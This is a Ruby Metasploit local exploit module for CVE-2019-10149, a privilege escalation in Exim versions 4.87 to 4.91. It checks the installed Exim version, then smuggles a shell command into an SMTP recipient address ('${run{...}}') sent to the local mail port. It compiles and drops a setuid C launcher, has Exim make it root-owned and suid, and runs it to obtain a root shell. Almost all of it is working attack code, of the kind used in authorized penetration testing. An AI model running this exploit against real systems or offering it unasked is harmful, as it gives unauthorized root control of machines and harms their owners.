##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Exim 4.87 - 4.91 Local Privilege Escalation',
                      'Description'    => %q{
                        This module implements a flaw found in Exim versions 4.87 to 4.91 (inclusive).
                        Improper validation of recipient address in deliver_message()
                        function in /src/deliver.c may lead to remote command execution
                        (CVE-2019-10149).
                      },
                        'License'        => MSF_LICENSE,
                        'Author'         =>
                      [
                        'Marco Ivaldi (@0xdea)', # Working exploit
                        'Guillaume AndrÃ© (@yaumn_)' # Metasploit module
                      ],
                      'DisclosureDate' => '2019-06-05',
                      'Platform'       => [ 'linux' ],
                      'Arch'           => [ ARCH_X86, ARCH_X64 ],
                      'SessionTypes'   => [ 'shell', 'meterpreter' ],
                      'Targets'        =>
                      [
                        [
                          'Exim 4.87 - 4.91',
                          lower_version: Gem::Version.new('4.87'),
                          upper_version: Gem::Version.new('4.91')
                        ]
                      ],
                      'References'     =>
                      [
                        [ 'CVE', '2019-10149' ],
                        [ 'EDB', '46996' ]
                      ]
                     ))

    register_options(
      [
        OptString.new('EXIMPATH', [false, 'The path to the exim executable (used to check for vulnerability)']),
        OptInt.new('EXIMPORT', [true, 'The port exim is listening to', 25])
      ])

    register_advanced_options(
      [
        OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
      ])
  end

  def check
    exim = if datastore['EXIMPATH']
             datastore['EXIMPATH']
           else
             'exim'
           end
    if cmd_exec("which #{exim}").blank?
      print_error('Exim executable not found. You may want to set EXIMPATH.')
      return CheckCode::Unknown
    end

    res = cmd_exec("#{exim} -bV")
    if res =~ /Exim version ([0-9\.]*) /i # Maybe improve the regex
      version = Gem::Version.new($1)
      if version >= target[:lower_version] && version <= target[:upper_version]
        return CheckCode::Appears
      else
        return CheckCode::Safe
      end
    end
    CheckCode::Unknown
  end

  def encode_command(cmd)
    '\x' + cmd.unpack('H2' * cmd.length).join('\x')
  end

  def inject_payload(payload)
    if session.type == 'meterpreter'
      socket_subsystem = Rex::Post::Meterpreter::Extensions::Stdapi::Net::Socket.new(client)
      params = Rex::Socket::Parameters.new({
        'PeerHost' => '127.0.0.1',
        'PeerPort' => datastore['EXIMPORT']
      })
      socket = socket_subsystem.create_tcp_client_channel(params)
      socket.gets
      socket.puts("helo localhost\n")
      socket.gets
      socket.puts("mail from:<>\n")
      socket.gets
      socket.puts("rcpt to:<${run{#{payload}}}@localhost>\n")
      socket.gets
      socket.puts("data\n")
      socket.gets
      for i in (1..31)
        socket.puts("Received: #{i}\n")
      end
      socket.puts(".\n")
      socket.gets
      socket.puts("quit\n")
      socket.close
      socket_subsystem.shutdown
    else
      res = cmd_exec("exec 3<>/dev/tcp/localhost/#{datastore['EXIMPORT']}")

      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('echo "helo localhost" >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('echo "mail from:<>" >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec("echo 'rcpt to:<${run{#{payload}}}@localhost>' >&3")
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('echo "data" >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      for i in (1..31)
        cmd_exec("echo 'Received: #{i}' >&3")
      end
      cmd_exec('echo "." >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('echo "quit" >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('exec 3<&-')
    end

    print_status('Payload sent, wait a few seconds...')
    Rex.sleep(5)
  end

  def on_new_session(session)
    super

    if session.type == 'meterpreter'
      session.core.use('stdapi') unless session.ext.aliases.include?('stdapi')
      session.fs.file.rm(@suid_shell_launcher)
    else
      client.shell_command_token("rm -f #{@suid_shell_launcher}")
    end

    print_good("Check session #{session.name}, you should have a root shell!")
  end

  def exploit
    shell = File.join(datastore['WritableDir'],
                      Rex::Text.rand_text_alpha(10))
    write_file(shell, payload.encoded_exe)
    register_files_for_cleanup(shell)
    cmd_exec("chmod +x #{shell}")

    shell_launcher_c_code = %|
          #include <unistd.h>
          #include <sys/types.h>

          int main() {
            setuid(0);
            setgid(0);
            char *argv[] = {"#{shell}", NULL};
            execve("#{shell}", argv, NULL);
            return 0;
          }
    |

    @suid_shell_launcher = File.join(datastore['WritableDir'],
                                     Rex::Text.rand_text_alpha(10))
    write_file("#{@suid_shell_launcher}.c", shell_launcher_c_code)
    cmd_exec("gcc -o #{@suid_shell_launcher} #{@suid_shell_launcher}.c")
    file_rm("#{@suid_shell_launcher}.c")
    inject_payload(encode_command("/bin/bash -c \"chown root #{@suid_shell_launcher};"\
                                  "chmod 4755 #{@suid_shell_launcher}\""))
    file_info = cmd_exec("ls -l #{@suid_shell_launcher}")
    if file_info =~ /-rwsr-xr-x/ && file_info =~ /root/
      cmd_exec(@suid_shell_launcher)

      if session_created?
        return
      end
    end

    file_rm(shell)

    if session.type == 'shell'
      cmd_exec("cp /bin/bash #{shell}")
      cmd_exec(@suid_shell_launcher)

      if is_root?
        print_good('You are now root, enjoy!')
      else
        print_error('Couldn\'t escalate privileges')
      end
    else
      print_error('Couldn\'t escalate privileges')
    end

    file_rm(@suid_shell_launcher)
  end
end
